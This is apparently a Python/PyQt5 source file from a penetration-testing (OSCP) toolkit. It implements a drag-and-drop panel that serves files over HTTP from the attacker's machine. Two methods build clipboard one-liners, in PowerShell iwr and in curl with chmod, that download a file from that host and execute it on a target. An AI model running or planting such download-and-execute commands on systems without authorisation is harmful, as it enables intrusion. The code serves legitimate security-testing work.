"""File Server Panel — drag-and-drop pour servir des fichiers en HTTP.

Fonctionnement :
  - Drop d'un fichier (depuis explorateur Windows, autre panel, etc.) ->
    le fichier est copie dans un dossier de serving temporaire
    (/tmp/oscp_serving/) et expose via HTTP python
  - Le serveur tourne toujours sur le meme port (defaut 8000). Tous les
    fichiers drop vont dans le meme dossier donc URL = http://LHOST:8000/<filename>
  - L'URL est copiee automatiquement dans le clipboard au drop
  - Liste visuelle des fichiers servis, bouton pour retirer chacun

Pas de securite : tous les types de fichiers acceptes (c'est l'outil local
de l'utilisateur, il sait ce qu'il fait).
"""
from __future__ import annotations

import shutil
from pathlib import Path
from typing import Optional

from PyQt5.QtCore import Qt, QTimer, pyqtSignal
from PyQt5.QtGui import QDragEnterEvent, QDropEvent
from PyQt5.QtWidgets import (
    QAbstractItemView, QApplication, QFileDialog, QHBoxLayout,
    QHeaderView, QLabel, QMenu, QMessageBox, QPushButton, QSpinBox,
    QTableWidget, QTableWidgetItem, QVBoxLayout, QWidget,
)

from core.file_server import DEFAULT_SERVING_DIR, FileServerManager
from core.logger import get_logger
from .widgets import SafeButton

log = get_logger(__name__)


SERVING_DIR = DEFAULT_SERVING_DIR


def _sizeof_fmt(num: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if abs(num) < 1024.0:
            return f"{num:.1f} {unit}"
        num //= 1024
    return f"{num:.1f} TB"


class FileServerPanel(QWidget):
    """Panel drag-drop pour serveur HTTP."""

    def __init__(
        self,
        file_servers: FileServerManager,
        attacker_ip_getter,
        parent: Optional[QWidget] = None,
    ):
        super().__init__(parent)
        self._fs = file_servers
        self._get_ip = attacker_ip_getter
        self._pulse_on = False
        self.setObjectName("fileServerPanel")
        self._install_local_style()

        # Serving dir
        SERVING_DIR.mkdir(parents=True, exist_ok=True)

        # State
        self._current_share = None  # FileShare actif
        self._default_port = 8000

        # Accept drops sur tout le panel
        self.setAcceptDrops(True)

        root = QVBoxLayout(self)
        root.setContentsMargins(6, 6, 6, 6)
        root.setSpacing(6)

        # Controle serveur
        ctrl_row = QHBoxLayout()
        ctrl_row.addWidget(QLabel("Port :"))
        self._port_spin = QSpinBox()
        self._port_spin.setRange(1024, 65535)
        self._port_spin.setValue(self._default_port)
        ctrl_row.addWidget(self._port_spin)

        self._btn_start = SafeButton("Demarrer")
        self._btn_start.setObjectName("fsStart")
        self._btn_start.clicked.connect(self._on_start_stop)
        ctrl_row.addWidget(self._btn_start)

        self._status_dot = QLabel()
        self._status_dot.setFixedSize(12, 12)
        ctrl_row.addWidget(self._status_dot)

        self._status_lbl = QLabel("[-] serveur arrete")
        self._status_lbl.setStyleSheet("color:#9e9e9e;")
        ctrl_row.addWidget(self._status_lbl, 1)
        root.addLayout(ctrl_row)

        # Zone drop
        self._drop_zone = QLabel(
            "<center>"
            "<span style='color:#555; font-size:11pt;'>"
            "Glisse-depose un fichier ici pour le servir<br>"
            "<span style='font-size:9pt; color:#777;'>"
            "ou clique 'Ajouter fichier'"
            "</span>"
            "</span>"
            "</center>"
        )
        self._drop_zone.setAlignment(Qt.AlignCenter)
        self._drop_zone.setMinimumHeight(80)
        self._drop_zone.setStyleSheet(
            "QLabel { "
            "background: #1a1a1a; "
            "border: 2px dashed #444; "
            "border-radius: 6px; "
            "padding: 18px; "
            "}"
        )
        root.addWidget(self._drop_zone)

        # Table fichiers servis
        self._table = QTableWidget(0, 3)
        self._table.setHorizontalHeaderLabels(["Fichier", "Taille", "URL"])
        self._table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
        self._table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        self._table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self._table.verticalHeader().setVisible(False)
        self._table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self._table.setAlternatingRowColors(True)
        self._table.setContextMenuPolicy(Qt.CustomContextMenu)
        self._table.customContextMenuRequested.connect(self._on_context_menu)
        self._table.cellDoubleClicked.connect(self._on_copy_url)
        self._table.itemSelectionChanged.connect(self._sync_snippet_buttons)
        root.addWidget(self._table, 1)

        # Actions
        actions = QHBoxLayout()
        btn_add = SafeButton("+ Ajouter fichier")
        btn_add.setObjectName("fsAdd")
        btn_add.clicked.connect(self._on_add_file)
        actions.addWidget(btn_add)

        btn_open_dir = SafeButton("Ouvrir dossier")
        btn_open_dir.setObjectName("fsOpen")
        btn_open_dir.clicked.connect(self._open_serving_dir)
        actions.addWidget(btn_open_dir)

        self._btn_copy_curl = SafeButton("Copier curl")
        self._btn_copy_curl.setObjectName("fsSnippet")
        self._btn_copy_curl.clicked.connect(lambda: self._copy_selected_snippet("curl"))
        actions.addWidget(self._btn_copy_curl)

        self._btn_copy_iwr = SafeButton("Copier iwr")
        self._btn_copy_iwr.setObjectName("fsSnippet")
        self._btn_copy_iwr.clicked.connect(lambda: self._copy_selected_snippet("iwr"))
        actions.addWidget(self._btn_copy_iwr)

        btn_clear = SafeButton("Tout effacer")
        btn_clear.setObjectName("fsDanger")
        btn_clear.clicked.connect(self._on_clear_all)
        actions.addWidget(btn_clear)

        actions.addStretch()
        root.addLayout(actions)

        # Refresh state
        self._refresh_table()

        # Connect fileservers signals
        self._fs.shares_changed.connect(self._refresh_status)
        self._sync_snippet_buttons()
        self._refresh_status()

        self._pulse_timer = QTimer(self)
        self._pulse_timer.setInterval(650)
        self._pulse_timer.timeout.connect(self._pulse_status)
        self._pulse_timer.start()

    # -- Public API ---------------------------------------------------------

    def add_transfer_file(self, src_path: str, *, start_server: bool = True) -> bool:
        """Add a local tool/binary to the served transfer directory."""
        if not self._add_file(src_path):
            return False
        self._sync_current_share()
        if start_server and self._current_share is None:
            self._start_server()
        self._refresh_table()
        self._select_file(Path(src_path).name)
        self._sync_snippet_buttons()
        self._flash_status(f"Ajoute au transfert : {Path(src_path).name}", "#81c784")
        return True

    def current_base_url(self) -> str:
        self._sync_current_share()
        ip = self._get_ip() or "LHOST"
        port = self._current_share.port if self._current_share else self._port_spin.value()
        return f"http://{ip}:{port}/"

    # -- Drag & drop ---------------------------------------------------------

    def dragEnterEvent(self, event: QDragEnterEvent) -> None:
        if event.mimeData().hasUrls():
            # Highlight visuel
            self._drop_zone.setStyleSheet(
                "QLabel { background:#1a2c4e; border:2px solid #4fc3f7; "
                "border-radius:6px; padding:18px; }"
            )
            event.acceptProposedAction()
        else:
            event.ignore()

    def dragLeaveEvent(self, event) -> None:
        self._reset_drop_style()
        super().dragLeaveEvent(event)

    def _reset_drop_style(self) -> None:
        color = "#2f6b45" if self._current_share else "#444"
        bg = "#17231c" if self._current_share else "#1a1a1a"
        self._drop_zone.setStyleSheet(
            f"QLabel {{ background:{bg}; border:2px dashed {color}; "
            "border-radius:6px; padding:18px; }}"
        )

    def dropEvent(self, event: QDropEvent) -> None:
        self._reset_drop_style()
        if not event.mimeData().hasUrls():
            return

        added = 0
        for url in event.mimeData().urls():
            src = url.toLocalFile()
            if src and Path(src).exists():
                if self._add_file(src):
                    added += 1

        event.acceptProposedAction()
        if added > 0:
            # Demarre le serveur si pas deja actif
            if self._current_share is None:
                self._start_server()
            self._refresh_table()

    # -- File management -----------------------------------------------------

    def _add_file(self, src_path: str) -> bool:
        """Copie src dans le dossier de serving. Retourne True si succes."""
        src = Path(src_path)
        if not src.exists():
            return False
        if src.is_dir():
            QMessageBox.information(
                self, "Info",
                "Les dossiers ne sont pas supportes. "
                "Glisse les fichiers individuellement ou zippe-les."
            )
            return False
        dest = SERVING_DIR / src.name
        try:
            if dest.exists():
                # Overwrite silencieux (on veut pas bloquer le flow)
                dest.unlink()
            shutil.copy2(src, dest)
            log.info("Fichier serving copie : %s -> %s", src, dest)
            # Copie URL dans clipboard
            ip = self._get_ip() or "LHOST"
            port = self._current_share.port if self._current_share else self._port_spin.value()
            url = f"http://{ip}:{port}/{src.name}"
            QApplication.clipboard().setText(url)
            return True
        except OSError as exc:
            QMessageBox.warning(self, "Erreur", f"Copie impossible : {exc}")
            return False

    def _on_add_file(self) -> None:
        paths, _ = QFileDialog.getOpenFileNames(self, "Ajouter fichier(s) a servir")
        changed = False
        for p in paths:
            if self._add_file(p):
                changed = True
        if changed:
            if self._current_share is None:
                self._start_server()
            self._refresh_table()

    def _on_clear_all(self) -> None:
        res = QMessageBox.question(
            self, "Tout effacer",
            f"Supprimer tous les fichiers du dossier {SERVING_DIR} ?",
            QMessageBox.Yes | QMessageBox.No,
        )
        if res != QMessageBox.Yes:
            return
        for f in SERVING_DIR.iterdir():
            try:
                if f.is_file():
                    f.unlink()
            except OSError:
                pass
        self._refresh_table()

    # -- Server control ------------------------------------------------------

    def _on_start_stop(self) -> None:
        if self._current_share is None:
            self._start_server()
        else:
            self._stop_server()

    def _start_server(self) -> None:
        try:
            port = self._port_spin.value()
            share = self._fs.start_http(str(SERVING_DIR), port=port)
            self._current_share = share
            self._btn_start.setText("Arreter")
            self._btn_start.setObjectName("fsStop")
            self._btn_start.style().unpolish(self._btn_start)
            self._btn_start.style().polish(self._btn_start)
            self._refresh_status()
            self._refresh_table()
        except Exception as exc:
            QMessageBox.warning(self, "Erreur serveur", str(exc))

    def _stop_server(self) -> None:
        if self._current_share is None:
            return
        try:
            self._fs.stop(self._current_share.id)
        finally:
            self._current_share = None
            self._btn_start.setText("Demarrer")
            self._btn_start.setObjectName("fsStart")
            self._btn_start.style().unpolish(self._btn_start)
            self._btn_start.style().polish(self._btn_start)
            self._refresh_status()
            self._refresh_table()

    def _refresh_status(self) -> None:
        self._sync_current_share()
        if self._current_share:
            ip = self._get_ip() or "LHOST"
            self._status_lbl.setText(
                f"[OK] http://{ip}:{self._current_share.port}/ "
                f"({len(list(SERVING_DIR.glob('*')))} fichiers)"
            )
            self._status_lbl.setStyleSheet("color:#81c784;")
        else:
            self._status_lbl.setText("[-] serveur arrete")
            self._status_lbl.setStyleSheet("color:#9e9e9e;")
        self._reset_drop_style()
        self._pulse_status()

    def _sync_current_share(self) -> None:
        share = self._fs.active_http(str(SERVING_DIR))
        if share is not self._current_share:
            self._current_share = share
            self._btn_start.setText("Arreter" if share else "Demarrer")
            self._btn_start.setObjectName("fsStop" if share else "fsStart")
            self._btn_start.style().unpolish(self._btn_start)
            self._btn_start.style().polish(self._btn_start)

    # -- Table ---------------------------------------------------------------

    def _refresh_table(self) -> None:
        self._sync_current_share()
        files = sorted([p for p in SERVING_DIR.glob("*") if p.is_file()])
        self._table.setRowCount(len(files))
        ip = self._get_ip() or "LHOST"
        port = self._current_share.port if self._current_share else self._port_spin.value()
        for row, p in enumerate(files):
            name_item = QTableWidgetItem(p.name)
            self._table.setItem(row, 0, name_item)
            size_item = QTableWidgetItem(_sizeof_fmt(p.stat().st_size))
            self._table.setItem(row, 1, size_item)
            url = f"http://{ip}:{port}/{p.name}"
            url_item = QTableWidgetItem(url)
            self._table.setItem(row, 2, url_item)
        self._sync_snippet_buttons()

    def _select_file(self, filename: str) -> None:
        for row in range(self._table.rowCount()):
            item = self._table.item(row, 0)
            if item and item.text() == filename:
                self._table.selectRow(row)
                return

    def _on_copy_url(self, row: int, _col: int) -> None:
        url_item = self._table.item(row, 2)
        if url_item:
            self._copy_text(url_item.text())

    def _on_context_menu(self, point) -> None:
        row = self._table.rowAt(point.y())
        if row < 0:
            return
        menu = QMenu(self)
        name_item = self._table.item(row, 0)
        name = name_item.text() if name_item else ""

        act_copy = menu.addAction("Copier URL")
        act_iwr = menu.addAction("Copier snippet iwr (Windows)")
        act_curl = menu.addAction("Copier snippet curl (Linux)")
        menu.addSeparator()
        act_delete = menu.addAction("Supprimer le fichier")

        chosen = menu.exec_(self._table.viewport().mapToGlobal(point))
        if not chosen:
            return

        url_item = self._table.item(row, 2)
        url = url_item.text() if url_item else ""

        if chosen is act_copy:
            self._copy_text(url)
        elif chosen is act_iwr:
            snippet = f'iwr {url} -OutFile C:\\Windows\\Temp\\{name}; C:\\Windows\\Temp\\{name}'
            self._copy_text(snippet)
        elif chosen is act_curl:
            snippet = f'curl {url} -o /tmp/{name} && chmod +x /tmp/{name} && /tmp/{name}'
            self._copy_text(snippet)
        elif chosen is act_delete:
            try:
                (SERVING_DIR / name).unlink()
                self._refresh_table()
                self._sync_snippet_buttons()
            except OSError as exc:
                QMessageBox.warning(self, "Erreur", str(exc))

    def _selected_row(self) -> int:
        rows = sorted({idx.row() for idx in self._table.selectedIndexes()})
        return rows[0] if rows else -1

    def _selected_file_url(self) -> tuple[str, str]:
        row = self._selected_row()
        if row < 0:
            return "", ""
        name_item = self._table.item(row, 0)
        url_item = self._table.item(row, 2)
        return (
            name_item.text() if name_item else "",
            url_item.text() if url_item else "",
        )

    def _sync_snippet_buttons(self) -> None:
        enabled = self._selected_row() >= 0
        self._btn_copy_curl.setEnabled(enabled)
        self._btn_copy_iwr.setEnabled(enabled)

    def _copy_selected_snippet(self, kind: str) -> None:
        name, url = self._selected_file_url()
        if not name or not url:
            return
        if kind == "iwr":
            text = f'iwr {url} -OutFile C:\\Windows\\Temp\\{name}; C:\\Windows\\Temp\\{name}'
        else:
            text = f'curl -fL {url} -o /tmp/{name} && chmod +x /tmp/{name} && /tmp/{name}'
        self._copy_text(text)

    def _copy_text(self, text: str) -> None:
        QApplication.clipboard().setText(text)
        self._flash_status("Copie dans le presse-papier", "#4fc3f7")

    def _flash_status(self, text: str, color: str) -> None:
        old_text = self._status_lbl.text()
        old_style = self._status_lbl.styleSheet()
        self._status_lbl.setText(text)
        self._status_lbl.setStyleSheet(f"color:{color}; font-weight:bold;")
        QTimer.singleShot(1200, lambda: self._restore_status(old_text, old_style))

    def _restore_status(self, text: str, style: str) -> None:
        if "Copie" in self._status_lbl.text():
            self._status_lbl.setText(text)
            self._status_lbl.setStyleSheet(style)

    def _pulse_status(self) -> None:
        if not hasattr(self, "_status_dot"):
            return
        if not self._current_share:
            self._status_dot.setStyleSheet(
                "background:#555; border-radius:6px; border:1px solid #333;"
            )
            return
        self._pulse_on = not self._pulse_on
        color = "#81c784" if self._pulse_on else "#2f6b45"
        self._status_dot.setStyleSheet(
            f"background:{color}; border-radius:6px; border:1px solid #b9f6ca;"
        )

    def _open_serving_dir(self) -> None:
        # Subprocess detache pour eviter que le file manager pollue notre stderr
        # (cas chromium-snap qui herite stderr du parent).
        import subprocess
        import shutil as _sh
        for opener in ("xdg-open", "open"):
            path = _sh.which(opener)
            if path:
                try:
                    subprocess.Popen(
                        [path, str(SERVING_DIR)],
                        stdin=subprocess.DEVNULL,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        start_new_session=True,
                        close_fds=True,
                    )
                    return
                except OSError:
                    continue
        # Fallback Qt
        from PyQt5.QtCore import QUrl
        from PyQt5.QtGui import QDesktopServices
        QDesktopServices.openUrl(QUrl.fromLocalFile(str(SERVING_DIR)))

    def _install_local_style(self) -> None:
        self.setStyleSheet("""
            QWidget#fileServerPanel QPushButton#fsStart {
                background: #263b2c;
                border-color: #81c784;
                color: #dff5e3;
                font-weight: bold;
            }
            QWidget#fileServerPanel QPushButton#fsStop {
                background: #3b2626;
                border-color: #ef5350;
                color: #ffdddd;
                font-weight: bold;
            }
            QWidget#fileServerPanel QPushButton#fsAdd {
                background: #2c4a5e;
                border-color: #4fc3f7;
                color: #ffffff;
            }
            QWidget#fileServerPanel QPushButton#fsSnippet {
                background: #34343a;
                border-color: #5a5a64;
            }
            QWidget#fileServerPanel QPushButton#fsDanger {
                background: #3b2b23;
                border-color: #ffb74d;
                color: #ffe0b2;
            }
        """)
